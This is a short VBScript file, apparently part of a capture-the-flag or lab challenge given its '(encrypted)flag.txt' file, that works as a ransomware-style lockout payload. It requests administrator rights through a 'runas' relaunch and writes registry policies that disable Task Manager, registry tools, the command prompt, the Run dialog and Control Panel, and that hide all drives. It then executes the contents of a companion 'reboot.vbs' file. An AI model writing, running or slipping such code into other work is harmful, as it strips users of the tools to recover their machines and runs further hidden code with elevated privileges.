Option Explicit
RunAsAdmin()
Dim obj, fs, ts2, body2
Set obj = CreateObject("wscript.shell")
Set fs = CreateObject("Scripting.FileSystemObject")
curDir = fs.GetAbsolutePathName(".") & "\reboot.vbs"
Set ts2 = fs.OpenTextFile(curDir)
body2 = ts2.ReadAll
ts2.Close
curDir2 = fs.GetAbsolutePathName(".") & "\(encrypted)flag.txt"
obj.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun", 1, "REG_DWORD" 
obj.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoControlPanel", 1, "REG_DWORD"
obj.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives", 67108863, "REG_DWORD"
obj.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD" 
obj.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "REG_DWORD"
obj.RegWrite "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System\DisableCMD", 1, "REG_DWORD"
set objFile = fs.CreateTextFile(curDir2, True)
objFile.Close
Execute body2
Function RunAsAdmin()
	Dim objAPP
	If WScript.Arguments.length = 0 Then
		 Set objAPP = CreateObject("Shell.Application")
		 objAPP.ShellExecute "wscript.exe", """" & _
		 WScript.ScriptFullName & """" & " RunAsAdministrator",,"runas", 1
		 WScript.Quit
		 End If
End Function
